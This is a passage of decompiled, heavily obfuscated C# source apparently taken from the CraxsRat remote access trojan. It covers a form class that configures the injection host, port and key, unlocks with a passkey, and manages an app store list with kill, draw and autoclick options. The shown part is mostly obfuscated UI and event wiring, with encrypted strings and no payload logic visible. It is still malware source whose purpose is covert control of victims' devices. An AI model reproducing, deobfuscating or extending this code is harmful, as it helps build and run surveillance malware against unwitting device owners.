              num1 = (int) num2 * -192932472 ^ -122619997;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual DrakeUIButtonIcon DrakeUIButtonIcon1
    {
      get => this._DrakeUIButtonIcon1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DrakeUIButtonIcon1_Click);
label_1:
        int num1 = -794385965;
        DrakeUIButtonIcon drakeUiButtonIcon1;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (-(num1 - -(-((651934886 ^ -1402704350) - 1044400243) ^ -51095278) - ~343492252 ^ -138512423 * ~(-1519688061 - 81166026)) ^ -1545138312 ^ -1808572990 ^ -334570319)) % 9U)
          {
            case 0:
              int num3 = drakeUiButtonIcon1 == null ? -264005360 : (num3 = -1166292881);
              num1 = num3 ^ (int) num2 * 225941591;
              continue;
            case 1:
              goto label_3;
            case 2:
              this._DrakeUIButtonIcon1 = value;
              num1 = -1217359664;
              continue;
            case 3:
              drakeUiButtonIcon1.Click -= eventHandler;
              num1 = (int) num2 * -561728261 ^ -1429096078;
              continue;
            case 4:
              drakeUiButtonIcon1.Click += eventHandler;
              num1 = (int) num2 * -945051157 ^ -170077341;
              continue;
            case 5:
              int num4 = drakeUiButtonIcon1 == null ? 528279160 : (num4 = 1169830930);
              num1 = num4 ^ (int) num2 * 690701221;
              continue;
            case 6:
              goto label_1;
            case 7:
              drakeUiButtonIcon1 = this._DrakeUIButtonIcon1;
              num1 = (int) num2 * -1273109468 ^ 909343516;
              continue;
            case 8:
              drakeUiButtonIcon1 = this._DrakeUIButtonIcon1;
              num1 = (int) num2 * -1433478236 ^ 2031318684;
              continue;
            default:
              goto label_11;
          }
        }
label_3:
        return;
label_11:;
      }
    }

    [field: AccessedThroughProperty("ToolTips")]
    internal virtual DrakeUIToolTip ToolTips { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("ImageList1")]
    internal virtual ImageList ImageList1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual BackgroundWorker downloadworker
    {
      get => this._downloadworker;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        DoWorkEventHandler workEventHandler = new DoWorkEventHandler(this.CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj);
label_1:
        int num1 = -2022840472;
        BackgroundWorker downloadworker;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (((num1 ^ -(-~(2027319310 - -2016340513) * 1575911469)) - (538351123 * -(-23831689 * 2058110393) - 2042543422)) * -1802469295 ^ -915704668)) % 7U)
          {
            case 0:
              downloadworker.DoWork -= workEventHandler;
              num1 = (int) num2 * -1827796368 ^ -1655643329;
              continue;
            case 1:
              downloadworker = this._downloadworker;
              int num3 = downloadworker == null ? -1830046142 : (num3 = 1365412278);
              num1 = num3 ^ (int) num2 * -374206133;
              continue;
            case 2:
              downloadworker.DoWork += workEventHandler;
              num1 = (int) num2 * 1114186583 ^ 681411968;
              continue;
            case 3:
              goto label_1;
            case 4:
              this._downloadworker = value;
              num1 = 915297568;
              continue;
            case 5:
              goto label_3;
            case 6:
              downloadworker = this._downloadworker;
              int num4 = downloadworker == null ? 1746656723 : (num4 = 405777162);
              num1 = num4 ^ (int) num2 * 1900946978;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    [field: AccessedThroughProperty("downprogress")]
    internal virtual DrakeUIProcessBar downprogress { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("workpanel")]
    internal virtual Panel workpanel { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("workimage")]
    internal virtual DrakeUIImageButton workimage { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("worklabel")]
    internal virtual Label worklabel { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("worklog")]
    internal virtual DrakeUITextBox worklog { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("lockpanel")]
    internal virtual Panel lockpanel { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("Panel3")]
    internal virtual Panel Panel3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("Label15")]
    internal virtual Label Label15 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("Label13")]
    internal virtual Label Label13 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("PictureBox1")]
    internal virtual PictureBox PictureBox1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("strpasstext")]
    internal virtual DrakeUITextBox strpasstext { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("Label17")]
    internal virtual Label Label17 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual DrakeUIButtonIcon b_ok
    {
      get => this._b_ok;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.b_ok_click);
label_1:
        int num1 = 1667240249;
        DrakeUIButtonIcon bOk;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ((~(~num1 * -493975071) ^ -(1829955963 - -1092632895) ^ -433008283) * -1464342459)) % 9U)
          {
            case 0:
              goto label_1;
            case 1:
              this._b_ok = value;
              num1 = -379325362;
              continue;
            case 2:
              goto label_3;
            case 3:
              bOk.Click -= eventHandler;
              num1 = (int) num2 * -1803759207 ^ -1331181138;
              continue;
            case 4:
              int num3 = bOk == null ? 560695778 : (num3 = 1212251399);
              num1 = num3 ^ (int) num2 * -1264146239;
              continue;
            case 5:
              int num4 = bOk == null ? -1143535150 : (num4 = -1676404501);
              num1 = num4 ^ (int) num2 * -1262803407;
              continue;
            case 6:
              bOk = this._b_ok;
              num1 = (int) num2 * 239910238 ^ 1337747185;
              continue;
            case 7:
              bOk = this._b_ok;
              num1 = (int) num2 * 626680748 ^ 464316065;
              continue;
            case 8:
              bOk.Click += eventHandler;
              num1 = (int) num2 * -265723009 ^ -1245967406;
              continue;
            default:
              goto label_11;
          }
        }
label_3:
        return;
label_11:;
      }
    }

    internal virtual DrakeUIButtonIcon DrakeUIButtonIcon3
    {
      get => this._DrakeUIButtonIcon3;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DrakeUIButtonIcon3_Click);
label_1:
        int num1 = -1635122562;
        while (true)
        {
          int num2 = num1;
          uint num3;
          DrakeUIButtonIcon drakeUiButtonIcon3;
          switch ((num3 = (uint) (~(954803311 * (-1084626350 - (-50434482 - -1311193846)) + ((--803999929 ^ 2142659406) - (1013003921 - -357543471 + (1989236155 + 2109031110))) - num2 * 22201615 + (1614663475 - -104017663 - (-103471516 - 1421720628) - -1300740667 * (-159353658 * 1974435917))) - 1895092154 * 363430803 - -1932059104)) % 9U)
          {
            case 0:
              drakeUiButtonIcon3.Click -= eventHandler;
              num1 = (int) num3 * 253376884 ^ -434223987;
              continue;
            case 1:
              this._DrakeUIButtonIcon3 = value;
              num1 = 717416695;
              continue;
            case 2:
              drakeUiButtonIcon3.Click += eventHandler;
              num1 = (int) num3 * -1232082060 ^ -203837545;
              continue;
            case 3:
              goto label_1;
            case 4:
              int num4 = drakeUiButtonIcon3 == null ? -1574116387 : (num4 = 1007081265);
              num1 = num4 ^ (int) num3 * 1346104104;
              continue;
            case 5:
              int num5 = drakeUiButtonIcon3 == null ? -600464819 : (num5 = -1495785370);
              num1 = num5 ^ (int) num3 * -559129270;
              continue;
            case 6:
              drakeUiButtonIcon3 = this._DrakeUIButtonIcon3;
              num1 = (int) num3 * 1341990211 ^ -797330568;
              continue;
            case 7:
              drakeUiButtonIcon3 = this._DrakeUIButtonIcon3;
              num1 = (int) num3 * 1836728894 ^ -1510219637;
              continue;
            case 8:
              goto label_3;
            default:
              goto label_11;
          }
        }
label_3:
        return;
label_11:;
      }
    }

    internal virtual DrakeUIAvatar showworkbtn
    {
      get => this._showworkbtn;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Showworkbtn_Click);
        DrakeUIAvatar showworkbtn = this._showworkbtn;
label_1:
        int num1 = 822602190;
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) ~-(-((-(-1049050843 - -87678657) + 254733953 * (956741710 ^ 570617568)) * -47031273) - num2)) % 8U)
          {
            case 0:
              this._showworkbtn = value;
              num1 = 1642346557;
              continue;
            case 1:
              int num4 = showworkbtn == null ? -34246181 : (num4 = 1012185893);
              num1 = num4 ^ (int) num3 * -2000621484;
              continue;
            case 2:
              showworkbtn = this._showworkbtn;
              num1 = (int) num3 * 887141086 ^ 1993819380;
              continue;
            case 3:
              goto label_1;
            case 4:
              showworkbtn.Click += eventHandler;
              num1 = (int) num3 * 29252217 ^ -1514465922;
              continue;
            case 5:
              goto label_3;
            case 6:
              showworkbtn.Click -= eventHandler;
              num1 = (int) num3 * 852078848 ^ 18211183;
              continue;
            case 7:
              int num5 = showworkbtn == null ? -881461137 : (num5 = -953346298);
              num1 = num5 ^ (int) num3 * -900809037;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    [field: AccessedThroughProperty("ComboPrims")]
    public virtual ComboBox ComboPrims { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual DrakeUIButtonIcon DrakeUIButtonIcon4
    {
      get => this._DrakeUIButtonIcon4;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DrakeUIButtonIcon4_Click);
        DrakeUIButtonIcon drakeUiButtonIcon4 = this._DrakeUIButtonIcon4;
label_1:
        int num1 = -431813477;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (~num1 + (627881543 * (1643646137 * 1677818700) ^ 500014123) ^ ~-986329333 + (-367393898 ^ 20594861) - -44214171)) % 7U)
          {
            case 0:
              goto label_3;
            case 1:
              int num3 = drakeUiButtonIcon4 == null ? 2057397682 : (num3 = 1874098923);
              num1 = num3 ^ (int) num2 * 1091678152;
              continue;
            case 2:
              int num4 = drakeUiButtonIcon4 == null ? -445747770 : (num4 = -598285119);
              num1 = num4 ^ (int) num2 * 1416941704;
              continue;
            case 3:
              drakeUiButtonIcon4.Click += eventHandler;
              num1 = (int) num2 * 1768429243 ^ -678933141;
              continue;
            case 4:
              this._DrakeUIButtonIcon4 = value;
              drakeUiButtonIcon4 = this._DrakeUIButtonIcon4;
              num1 = 632395221;
              continue;
            case 5:
              goto label_1;
            case 6:
              drakeUiButtonIcon4.Click -= eventHandler;
              num1 = (int) num2 * 134507673 ^ 1078604403;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    [field: AccessedThroughProperty("TabPage4")]
    internal virtual TabPage TabPage4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual DrakeUIButtonIcon DrakeUIButtonIcon2
    {
      get => this._DrakeUIButtonIcon2;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.CraxsRatkfvuiorkenfudpajrsnCraxsRatsqwefghcvbeefrw);
label_1:
        int num1 = -1856857464;
        DrakeUIButtonIcon drakeUiButtonIcon2;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ~~(-((num1 ^ 2086129731 * -(~169633502 - -151460839) + -(~(-59912822 - -2030900723) ^ ~~248723033)) * 1851164785) ^ 253332956)) % 7U)
          {
            case 0:
              goto label_3;
            case 1:
              drakeUiButtonIcon2.Click -= eventHandler;
              num1 = (int) num2 * -1407843537 ^ -175121166;
              continue;
            case 2:
              drakeUiButtonIcon2.Click += eventHandler;
              num1 = (int) num2 * 1880633444 ^ 257294435;
              continue;
            case 3:
              drakeUiButtonIcon2 = this._DrakeUIButtonIcon2;
              int num3 = drakeUiButtonIcon2 == null ? 673609141 : (num3 = 1805422550);
              num1 = num3 ^ (int) num2 * -2142377045;
              continue;
            case 4:
              this._DrakeUIButtonIcon2 = value;
              drakeUiButtonIcon2 = this._DrakeUIButtonIcon2;
              num1 = -1299514841;
              continue;
            case 5:
              int num4 = drakeUiButtonIcon2 == null ? -330176209 : (num4 = 651170273);
              num1 = num4 ^ (int) num2 * 621662278;
              continue;
            case 6:
              goto label_1;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual DrakeUIButtonIcon DrakeUIButtonIcon5
    {
      get => this._DrakeUIButtonIcon5;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.CraxsRatkfvuiorkenfudpajrsnCraxsRatswefzxcuyhg);
        DrakeUIButtonIcon drakeUiButtonIcon5 = this._DrakeUIButtonIcon5;
        if (drakeUiButtonIcon5 == null)
          goto label_5;
label_1:
        int num1 = 1725524620;
label_2:
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) -(-((num1 - -(-63870101 ^ -(28338594 ^ 119180518) ^ -1436682162)) * 50962053 * -2145618347) * 1135635779)) % 7U)
          {
            case 0:
              goto label_1;
            case 1:
              drakeUiButtonIcon5.Click -= eventHandler;
              num1 = (int) num2 * 1127791315 ^ -1127248372;
              continue;
            case 2:
              goto label_3;
            case 3:
              int num3 = drakeUiButtonIcon5 == null ? 735704466 : (num3 = 1137142740);
              num1 = num3 ^ (int) num2 * -325061852;
              continue;
            case 4:
              goto label_5;
            case 5:
              drakeUiButtonIcon5.Click += eventHandler;
              num1 = (int) num2 * 1181224761 ^ -1665428787;
              continue;
            case 6:
              drakeUiButtonIcon5 = this._DrakeUIButtonIcon5;
              num1 = (int) num2 * -1138474731 ^ -1091504689;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:
        return;
label_5:
        this._DrakeUIButtonIcon5 = value;
        num1 = -819300060;
        goto label_2;
      }
    }

    [field: AccessedThroughProperty("Label16")]
    internal virtual Label Label16 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("iconprim")]
    internal virtual DataGridViewImageColumn iconprim { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("primname")]
    internal virtual DataGridViewTextBoxColumn primname { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("sizeapp")]
    internal virtual DataGridViewTextBoxColumn sizeapp { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("verapp")]
    internal virtual DataGridViewTextBoxColumn verapp { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("Status")]
    internal virtual DataGridViewTextBoxColumn Status { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("apdate")]
    internal virtual DataGridViewTextBoxColumn apdate { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("sel")]
    internal virtual DataGridViewCheckBoxColumn sel { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("checkkill")]
    internal virtual DrakeUICheckBox checkkill { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("checkDraw")]
    internal virtual DrakeUICheckBox checkDraw { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("checkautoclick")]
    internal virtual DrakeUICheckBox checkautoclick { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("checksuper")]
    internal virtual DrakeUICheckBox checksuper { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    public void InvokeIfRequired(object[] objs)
    {
    }

    private void CraxsRatkfvuiorkenfudpajrsnCraxsRatstughes(object sender, EventArgs e)
    {
      this.ComboPrims.Text = EXGuarder.\u00310562426;
label_1:
      int num1 = 1746342322;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (~-num1 - (-1786114798 ^ --1760362942))) % 5U)
        {
          case 1:
            this.lockpanel.BringToFront();
            this.storebtn.Enabled = false;
            num1 = (int) num2 * 1710425246 ^ -1587259939;
            continue;
          case 2:
            this.strpasstext.Text = RegistryHandler.passkey();
            num1 = (int) num2 * -1395622419 ^ 1306254381;
            continue;
          case 3:
            this.reqbtn.Enabled = false;
            num1 = (int) num2 * -288959165 ^ 221724808;
            continue;
          case 4:
            goto label_1;
          default:
            goto label_6;
        }
      }
label_6:
      this.exitbtn.Enabled = false;
      try
      {
        // ISSUE: reference to a compiler-generated method
        this.CLiname.Text = MySettings.get_Settings().inj_tnam;
label_8:
        int num3 = 270861778;
        while (true)
        {
          uint num4;
          switch ((num4 = (uint) (~-num3 - (-1786114798 ^ --1760362942))) % 3U)
          {
            case 1:
              // ISSUE: reference to a compiler-generated method
              this.Host.Text = MySettings.get_Settings().inj_thost;
              // ISSUE: reference to a compiler-generated method
              this.Port.Text = MySettings.get_Settings().inj_tport;
              num3 = (int) num4 * -430463771 ^ 693123253;
              continue;
            case 2:
              goto label_8;
            default:
              goto label_11;
          }
        }
label_11:
        // ISSUE: reference to a compiler-generated method
        this.TheKey.Text = MySettings.get_Settings().inj_tkey;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
label_13:
        int num5 = 276805906;
        while (true)
        {
          uint num6;
          switch ((num6 = (uint) (~-num5 - (-1786114798 ^ --1760362942))) % 6U)
          {
            case 0:
              this.Port.Text = EXGuarder.\u0034E1E633A;
              num5 = (int) num6 * 763277853 ^ -923372857;
              continue;
            case 1:
              this.CLiname.Text = EXGuarder.\u00331376543;
              this.Host.Text = EXGuarder.\u0033C072D21;
              num5 = (int) num6 * -1313605275 ^ -857420868;
              continue;
            case 3:
              ProjectData.ClearProjectError();
              num5 = (int) num6 * 1336193030 ^ -822555021;
              continue;
            case 4:
              this.TheKey.Text = EXGuarder.\u0036343200F;
              num5 = (int) num6 * -1080790382 ^ 210454402;
              continue;
            case 5:
              goto label_13;
            default:
              goto label_19;
          }
        }
      }
label_19:
      this.lockpanel.Visible = true;
    }

    private void Timer1_Tick(object sender, EventArgs e)
    {
      if (Operators.CompareString(this.statustext.Text, EXGuarder.\u00341010C35, false) != 0)
        goto label_11;
label_1:
      int num1 = 687177282;
label_2:
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) (1159279546 - (-((~-1802243726 - (280774285 - -1374593282) ^ (-304752236 ^ 558448781) - 1544793710) - -(num2 * -1913137251)) ^ ~-661273432))) % 24U)
        {
          case 0:
            int num4;
            num1 = num4 = !(this.statustext.Text.Length < this.conecttext.Length & !this.stage2) ? -708713262 : (num4 = -1103992839);
            continue;
          case 1:
            Label statustext1;
            string str1 = (statustext1 = this.statustext).Text + Conversions.ToString(this.loadingtext[this.statustext.Text.Length]);
            statustext1.Text = str1;
            num1 = (int) num3 * 1551742889 ^ 549189875;
            continue;
          case 2:
            goto label_1;
          case 3:
            this.storebtn.Enabled = true;
            this.reqbtn.Enabled = true;
            num1 = (int) num3 * -1857770812 ^ -299582652;
            continue;
          case 4:
            this.statustext.Text = EXGuarder.\u003683F3012;
            num1 = (int) num3 * -120835913 ^ 325723107;
            continue;
          case 5:
            this.statustext.Text = this.statustext.Text.Replace(EXGuarder.\u0035F17772A, EXGuarder.\u003683F3012);
            num1 = -1354415809;
            continue;
          case 6:
            this.exitbtn.Enabled = true;
            num1 = (int) num3 * 1640150818 ^ -979278283;
            continue;
          case 7:
            this.statustext.Text = EXGuarder.\u003683F3012;
            num1 = (int) num3 * -829526691 ^ -942178154;
            continue;
          case 8:
            int num5;
            num1 = num5 = this.stage1 ? -2132298842 : (num5 = 432136139);
            continue;
          case 9:
            Label statustext2;
            string str2 = (statustext2 = this.statustext).Text + Conversions.ToString(this.conecttext[this.statustext.Text.Length]);
            statustext2.Text = str2;
            num1 = (int) num3 * 1483744485 ^ 544714357;
            continue;
          case 10:
            this.Timer1.Stop();
            int num6 = !Codes.MyMsgBox(EXGuarder.\u0031578090A, EXGuarder.\u00322740E26, false, Craxs_Rat.My.Resources.Resources.error48px) ? -349644385 : (num6 = 42568640);
            num1 = num6 ^ (int) num3 * -1911197552;
            continue;
          case 11:
            goto label_3;
          case 12:
            num1 = (int) num3 * -525633589 ^ 1522094123;
            continue;
          case 13:
            int num7 = this.loadworker.IsBusy ? -161843220 : (num7 = -691120292);
            num1 = num7 ^ (int) num3 * -56607694;
            continue;
          case 14:
            this.reqbtn.Enabled = true;
            num1 = (int) num3 * 370264584 ^ -247840509;
            continue;
          case 15:
            num1 = (int) num3 * 618461945 ^ 492822448;
            continue;
          case 16:
            this.loadworker.RunWorkerAsync();
            num1 = (int) num3 * 213368928 ^ 77351846;
            continue;
          case 17:
            this.stage2 = true;
            this.Timer1.Stop();
            this.statustext.Text = EXGuarder.\u003683F3012;
            num1 = (int) num3 * 318118182 ^ -489249518;
            continue;
          case 18:
            num1 = (int) num3 * -957706840 ^ 1228255023;
            continue;
          case 19:
            goto label_11;
          case 20:
            int num8;
            num1 = num8 = !this.loadsuccess ? -1149676011 : (num8 = -517479657);
            continue;
          case 21:
            int num9;
            num1 = num9 = !this.loadfaild ? -670739675 : (num9 = 1958230372);
            continue;
          case 22:
            num1 = (int) num3 * -2143145504 ^ 346915455;
            continue;
          case 23:
            this.stage1 = true;
            num1 = (int) num3 * -394781393 ^ -1947838390;
            continue;
          default:
            goto label_26;
        }
      }
label_3:
      return;
label_26:
      return;
label_11:
      num1 = !(this.statustext.Text.Length < this.loadingtext.Length & !this.stage1) ? 1505123502 : (num1 = 1436240561);
      goto label_2;
    }

    private void DrakeUIButtonIcon12_Click(object sender, EventArgs e) => this.Close();

    private void DrakeUIButtonIcon13_Click(object sender, EventArgs e)
    {
      this.WindowState = FormWindowState.Minimized;
    }

    private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsascewfvwgfgh(object sender, DoWorkEventArgs e)
    {
    }

    private void Panel1_MouseDown(object sender, MouseEventArgs e)
    {
      if (e.Button != MouseButtons.Left)
        return;
label_1:
      int num1 = 506750905;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) (-((-723830943 ^ -2024762481 ^ 875251961 * 935939446) - 1468739749 * (1647905174 - -944485569) - (-1900806011 * (-475952887 * --508595844) - (num2 ^ --(~(1978474735 * 1515928995) - (-409640501 - -57047832))))) * -744794379)) % 4U)
        {
          case 0:
            goto label_6;
          case 1:
            Codes.ReleaseCapture();
            num1 = (int) num3 * 805320759 ^ -785883435;
            continue;
          case 2:
            Codes.SendMessage(this.Handle, 161, 2, 0);
            num1 = (int) num3 * 187055130 ^ 585801080;
            continue;
          case 3:
            goto label_1;
          default:
            goto label_7;
        }
      }
label_6:
      return;
label_7:;
    }

    private void Exitbtn_Click(object sender, EventArgs e) => this.Close();

    private void Storebtn_Click(object sender, EventArgs e)
    {
      this.Panelhome.SendToBack();
      this.mainpanel.BringToFront();
    }

    private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
    {
      this.mainpanel.SendToBack();
label_1:
      int num1 = 1315209578;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) -(((num1 - ~-(~(-2101121988 - 1009185237) + ~-153886137)) * -255010613 - -((445344639 ^ -802136795) + (-2067011008 - 1235565147)) - (-877572363 * -393984055 ^ -648447469 ^ -1553669877)) * 208718257)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            this.Panelhome.BringToFront();
            num1 = (int) num2 * -918446013 ^ 1270876004;
            continue;
          case 2:
            goto label_3;
          default:
            goto label_5;
        }
      }
label_3:
      return;
label_5:;
    }

    private void WebsiteToolStripMenuItem_Click(object sender, EventArgs e)
    {
      try
      {
        if (this.DGVSTORE.Rows.Count <= 0)
          return;
label_1:
        int num1 = 1375230910;
        string[] tag;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ~-(num1 * 67026113)) % 5U)
          {
            case 0:
              goto label_8;
            case 1:
              Process.Start(tag[2]);
              num1 = (int) num2 * 705341887 ^ 1601919051;
              continue;
            case 2:
              tag = (string[]) this.DGVSTORE.SelectedRows[0].Tag;
              num1 = (int) num2 * -1950624337 ^ 1929147881;
              continue;
            case 3:
              int num3 = this.DGVSTORE.SelectedRows.Count <= 0 ? 1166293057 : (num3 = 1625159315);
              num1 = num3 ^ (int) num2 * -704747270;
              continue;
            case 4:
              goto label_1;
            default:
              goto label_9;
          }
        }
label_8:
        return;
label_9:;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public void logtowork(object[] obj)
    {
      if (this.worklog.InvokeRequired)
      {
label_1:
        int num1 = -779882790;
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) (159060309 - ((481826763 * 1818170387 ^ --2116960371) - (1705911586 - -472551991 - 218122246)) - (num2 - --(-257425755 * (350366326 + 619781475) - -1584664933 * 1349395013 * 588752687)) - (-1249149789 - -1977308166 + ~1219483890 ^ -1516642045 ^ -209237763 ^ -1697280622 - 1351490510))) % 3U)
          {
            case 0:
              goto label_6;
            case 1:
              this.worklog.Invoke((Delegate) new CraxsStore.InvocationDelegate(this.logtowork), (object) obj);
              num1 = (int) num3 * 803222003 ^ -410871200;
              continue;
            case 2:
              goto label_1;
            default:
              goto label_7;
          }
        }
label_6:
        return;
label_7:;
      }
      else
      {
        try
        {
          this.worklog.AppendText(obj[0].ToString());
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
    }

    public void logwork(string msg)
    {
      try
      {
        this.logtowork(new object[1]
        {
          (object) (msg + EXGuarder.\u0035951521E)
        });
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public void logtostatus(object[] obj)
    {
      if (this.statustext.InvokeRequired)
      {
label_1:
        int num1 = 216419773;
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) ~((-1260416827 ^ -213286662 ^ -1787492935 - -1021817694) - (num2 + --(~80149240 + (70586466 - 1384663983) + -639796575 * (3585169 + 648734904)) - (1821979093 - 1190899081 - (-1967994409 ^ 527834620) ^ 826507973) * 662887687 - (-540496916 - 1586244051 - (2041517371 ^ 1037420038) - (-2119482931 - 1734301205 ^ 1109663544 - -201898988))) + ~425939532)) % 3U)
          {
            case 0:
              goto label_6;
            case 1:
              this.statustext.Invoke((Delegate) new CraxsStore.recordnames(this.logtostatus), (object) obj);
              num1 = (int) num3 * 882057864 ^ 864801369;
              continue;
            case 2:
              goto label_1;
            default:
              goto label_7;
          }
        }
label_6:
        return;
label_7:;
      }
      else
      {
        try
        {
          this.statustext.Text = obj[0].ToString();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
    }

    public void logstatus(string msg)
    {
      try
      {
        this.logtostatus(new object[1]
        {
          (object) (msg + EXGuarder.\u003644F0A26)
        });
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void DownloadToolStripMenuItem_Click(object sender, EventArgs e)
    {
    }

    private void GooglePlayToolStripMenuItem_Click(object sender, EventArgs e)
    {
      try
      {
        if (this.DGVSTORE.Rows.Count <= 0)
          return;
label_1:
        int num1 = -112154283;
        while (true)
        {
          int num2 = num1;
          uint num3;
          string[] tag;
          switch ((num3 = (uint) ~-(2097847375 * ((~-1257562259 - (720496990 - -644305561 - (136514231 - 1049199492))) * 61783827) - num2)) % 5U)
          {
            case 0:
              tag = (string[]) this.DGVSTORE.SelectedRows[0].Tag;
              num1 = (int) num3 * 2037878838 ^ 754640590;
              continue;
            case 1:
              int num4 = this.DGVSTORE.SelectedRows.Count <= 0 ? 1065275808 : (num4 = 1671391454);
              num1 = num4 ^ (int) num3 * -321121458;
              continue;
            case 2:
              Process.Start(EXGuarder.\u00317427000 + tag[3]);
              num1 = (int) num3 * 1123176108 ^ -1360513524;
              continue;
            case 3:
              goto label_1;
            case 4:
              goto label_11;
            default:
              goto label_7;
          }
        }
label_11:
        return;
label_7:;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
label_9:
        int num5 = 1904643386;
        while (true)
        {
          int num6 = num5;
          uint num7;
          switch ((num7 = (uint) ~-(2097847375 * ((~-1257562259 - (720496990 - -644305561 - (136514231 - 1049199492))) * 61783827) - num6)) % 3U)
          {
            case 0:
              goto label_9;
            case 1:
              ProjectData.ClearProjectError();
              num5 = (int) num7 * 469903327 ^ 299207493;
              continue;
            case 2:
              goto label_3;
            default:
              goto label_14;
          }
        }
label_3:
        return;
label_14:;
      }
    }

    private void wc_UploadDataCompleted(object sender, UploadValuesCompletedEventArgs e)
    {
      Codes.MyMsgBox(EXGuarder.\u003220A0346, EXGuarder.\u0035F2D3814, false, Craxs_Rat.My.Resources.Resources.error48px);
      this.logwork(EXGuarder.\u003436C5623);
      this.downprogress.Value = 0;
label_1:
      int num1 = -1523510064;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (-(num1 - (-(-864626915 ^ 1781463377) + (--1932182162 + 1006557183 * -247741739) ^ 2011603735 * -1810591215 - 1178675827 + (-810238811 - ~-1735651251) ^ ((1384530866 ^ 339354696) - (1531882494 - 747761267)) * 511048559 ^ ~--498201019 + (-502705647 - ~-550383579))) * -538607527)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            this.logstatus(EXGuarder.\u00306592C6D);
            num1 = (int) num2 * -689626530 ^ 593428509;
